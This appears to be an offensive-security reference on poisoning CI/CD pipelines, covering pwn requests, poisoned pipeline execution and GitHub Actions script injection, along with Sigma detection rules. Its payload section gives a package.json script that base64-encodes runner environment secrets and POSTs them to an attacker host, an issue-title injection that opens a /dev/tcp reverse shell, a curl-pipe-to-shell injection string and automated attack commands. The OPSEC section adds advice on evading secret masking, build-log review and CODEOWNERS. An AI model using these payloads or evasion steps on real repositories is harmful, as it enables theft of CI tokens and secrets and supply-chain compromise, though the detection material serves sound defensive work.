# Pipeline Poisoning: Pwn Requests, PPE & Script Injection

ATT&CK: T1195.001 (Compromise Software Dependencies and Development Tools), T1059 (Command and
Scripting Interpreter), T1648 (Serverless/automation abuse) · CWE-94 (Code Injection), CWE-269
(Improper Privilege Management), CWE-913 (Improper Control of Dynamically-Managed Code Resources),
CWE-863 (Incorrect Authorization) · OWASP CICD-SEC-4 (Poisoned Pipeline Execution).

## Theory / Mechanism

A CI pipeline is *attacker-controllable code running with high privilege*. The pipeline reads
attacker-influenced input (PR head, issue title, branch name, build files) and executes it inside an
environment that holds secrets and a write-capable token. There are three structural sinks:

1. **Pwn request** — a workflow triggered by `pull_request_target` (or `workflow_run`,
   `issue_comment`, `discussion_comment`) runs in the *base* repo context (full secrets + write
   token) but the workflow then checks out and executes the *fork's* code. GitHub Security Lab
   coined "pwn request" in 2021; it is still the #1 GHA RCE class.

2. **Poisoned Pipeline Execution (PPE)** — OWASP CICD-SEC-4. Three variants:
   - *Direct PPE (D-PPE)*: attacker edits the workflow YAML itself (needs write/triage or a
     compromised bot, or a fork PR that the pipeline checks out).
   - *Indirect PPE (I-PPE)*: attacker edits files the pipeline *consumes* — `Makefile`,
     `package.json` scripts, `conftest.py`, `.pre-commit-config.yaml`, a custom build script. The
     `.github/workflows/` files are untouched, bypassing CODEOWNERS protection on workflow files.
   - *Public PPE (3PE)*: combination usable from a fork on a public repo.

3. **Script injection** — `${{ <expression> }}` is interpolated into the shell **before** the shell
   runs, so an attacker-controlled expression (`github.event.issue.title`,
   `github.event.pull_request.head.ref`, `github.event.comment.body`,
   `github.head_ref`, commit message/author) is concatenated straight into the command line. This is
   classic command injection (CWE-94).

GitLab and Jenkins have the same shape: `.gitlab-ci.yml` is the sink in GitLab; the Groovy Script
Console / `Jenkinsfile` is the sink in Jenkins.

## Vulnerable patterns (the sinks)

### Pwn request — checking out untrusted fork head with privileged trigger
```yaml
# .github/workflows/pr-build.yml  — VULNERABLE
on:
  pull_request_target:          # privileged: base-repo secrets + write token
    branches: [ main ]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.ref }}        # untrusted code...
          repository: ${{ github.event.pull_request.head.repo.full_name }}
      - run: npm ci && npm test     # ...executed with full privilege => RCE + secret theft
```

### Script injection — expression interpolated into `run:`
```yaml
# VULNERABLE: title is attacker-controlled, flows straight into the shell
on: { issues: { types: [opened] } }
jobs:
  triage:
    runs-on: ubuntu-latest
    steps:
      - run: echo "New issue: ${{ github.event.issue.title }}"   # CWE-94
```
A PR/issue title of `a"; curl https://attacker.tld/x | sh #` yields RCE on the runner.

### GitLab indirect PPE
```yaml
# .gitlab-ci.yml runs `make build`; attacker edits Makefile in an MR -> code exec on runner
test:
  script:
    - make test           # Makefile is attacker-editable in a merge request
```

## Working offensive payloads (authorized engagement)

### 1. Pwn-request exploit PR (exfiltrate the runner token + secrets)
On a target whose `pull_request_target` workflow runs `npm test`, drop this into the fork's
`package.json` (Indirect PPE — no workflow edit, bypasses CODEOWNERS):
```json
{
  "scripts": {
    "test": "node -e \"const h=require('https');const d=Buffer.from(JSON.stringify(process.env)).toString('base64');const r=h.request('https://OOB.attacker.tld/c',{method:'POST'});r.write(d);r.end();\""
  }
}
```
`process.env` on a GHA runner contains `GITHUB_TOKEN` (write-scoped for `pull_request_target`),
`ACTIONS_RUNTIME_TOKEN` (used for cache/artifact poisoning — see action-dependency-compromise.md),
`ACTIONS_ID_TOKEN_REQUEST_URL/TOKEN` (mint OIDC tokens — see secrets-oidc-abuse.md), and any
`env:`-injected `secrets.*`. Use an out-of-band collector (Burp Collaborator, `interactsh-client`)
so exfil is not visible in the build log.

### 2. Script-injection one-liner (reverse shell from the issue title)
```text
Issue title:  x"; bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' #
```

### 3. Enumerate the whole org for these sinks with gato-x
```bash
pipx install gato-x
# Enumerate self-hosted runners, injection, and pwn-request candidates across an org
gato-x enumerate --target ORG --output-json gato.json
# Attack mode: build a PPE PR automatically against a confirmed-vulnerable repo
gato-x attack --target ORG/REPO --pull-request --payload-file rev.sh
```

### 4. Static-audit a repo with the in-repo auditor (offline, no token)
```bash
python3 scripts/workflow_auditor.py --path ./target-repo
# Flags: privileged triggers + checkout of head.ref/sha; ${{ }} expressions inside run:;
# self-hosted labels; missing top-level permissions: block.
```

## Modern 2024-2026 variants (verified)

- **CVE-2024-6678 (GitLab, CVSS 9.9)** and **CVE-2024-6385 / CVE-2024-9164** — "run pipeline as
  arbitrary user" / unauthorized pipeline execution on branches. CVE-2024-6678 affects GitLab CE/EE
  from 8.14 < 17.1.7, 17.2 < 17.2.5, 17.3 < 17.3.2. An attacker triggers a pipeline as another
  (privileged) user, escalating to supply-chain compromise. Patch: upgrade.
- **spotbugs -> ... -> Bitwarden chain (Nov 2024 onward)** — a `pull_request_target` PPE on
  `spotbugs/sonar-findbugs` (2024-12-06) lifted a maintainer PAT, kicking off an 18-month chain of
  related GHA compromises. Root cause = the four GHA defaults: `pull_request_target` scope bleed,
  mutable tags, shared fork object pool, poisonable cache.
- **GhostAction (Sep 2025)** — 327 accounts hijacked, malicious workflows injected into 817 repos,
  3,325 secrets POSTed to attacker endpoints (see secrets-oidc-abuse.md).
- **`actions/checkout@v7` (2025) and `pull_request_target` default-branch source (Dec 2025)** —
  GitHub now resolves `pull_request_target` workflow source from the default branch (blocks running
  outdated vulnerable workflow versions on stale branches) and checkout v7 hardens fork handling.
  These narrow but do **not** eliminate pwn requests: if the workflow still checks out and runs PR
  head code, RCE+secret theft remains.

## Detection

**Sigma — GitHub audit log: privileged workflow triggered by an external fork PR**
```yaml
title: GitHub Actions Privileged Workflow From Fork PR (Pwn Request)
id: 5b2c9e2a-1f0e-4d3a-9c11-cicdppe0001
logsource: { product: github, service: audit }
detection:
  sel_trigger:
    action: 'workflows.created_workflow_run'
    event: 'pull_request_target'
  sel_fork:
    head_repository_fork: true
  condition: sel_trigger and sel_fork
level: high
falsepositives: [ trusted internal forks ]
```

**Runner egress (host EDR / Sigma process_creation)** — alert on a CI build process spawning a
network client to a host outside the dependency allowlist:
```yaml
title: CI Runner Outbound To Unexpected Host
logsource: { category: process_creation }
detection:
  sel:
    ParentImage|endswith: ['/node', '/python3', '/bash', '/Runner.Worker']
    Image|endswith: ['/curl', '/wget', '/nc', '/node']
    CommandLine|re: 'https?://(?!.*(github\.com|githubusercontent\.com|registry\.npmjs\.org|pypi\.org))'
  condition: sel
level: high
```

**Static / CI gate** — run `zizmor`, `octoscan`, or `poutine` on every workflow change:
```bash
pipx install zizmor && zizmor .github/workflows/    # flags template-injection, dangerous-triggers
docker run --rm -v "$PWD:/src" ghcr.io/boostsecurityio/poutine analyze_local /src
```

**IOCs**: new/modified `.github/workflows/*` or build-script files in a fork PR; `${{ github.event.*`
inside `run:`; `pull_request_target` + `checkout` of `head.ref`/`head.sha`; outbound from a runner to
a webhook/OOB domain; base64 blobs in build logs.

## OPSEC

- Touches: build log (often world-readable on public repos), runner FS, runner egress, GitHub audit
  log (privileged trigger, workflow-run, any push the token makes). Assume the audit log records the
  triggering PR and actor.
- Cleanup: nothing persists on GitHub-hosted (ephemeral) runners between jobs; on self-hosted runners
  remove dropped files and history (see runner-attacks.md). You cannot delete the org audit-log entry.
- Evasion: exfil out-of-band rather than to stdout (build logs are searched by defenders and by
  automated secret-scanners); base64/double-encode to defeat GitHub's `***` secret masking; use
  Indirect PPE (edit `package.json`/`Makefile`, not the workflow) to bypass CODEOWNERS on workflows;
  prefer a benign-looking dependency-install step over an obvious `curl|sh`.

## References

- GitHub Security Lab, "Keeping your GitHub Actions and workflows secure: Preventing pwn requests."
- OWASP Top 10 CI/CD Security Risks — CICD-SEC-4 Poisoned Pipeline Execution.
- Wiz, "Hardening GitHub Actions: Lessons from Recent Attacks" (wiz.io/blog/github-actions-security-guide).
- Orca Security, "pull_request_nightmare Part 2: Exploiting GitHub Actions for RCE and Supply Chain."
- Lyrie Research, "The CI/CD Killswitch: GitHub Actions' Systemic Design Flaws … spotbugs to Bitwarden."
- SC Media / GitLab advisory, CVE-2024-6678 (run pipeline as arbitrary user).
- StepSecurity, "GitHub Actions Pwn Request Vulnerability."
- zizmor (woodruffw), poutine (BoostSecurity), octoscan static analyzers.
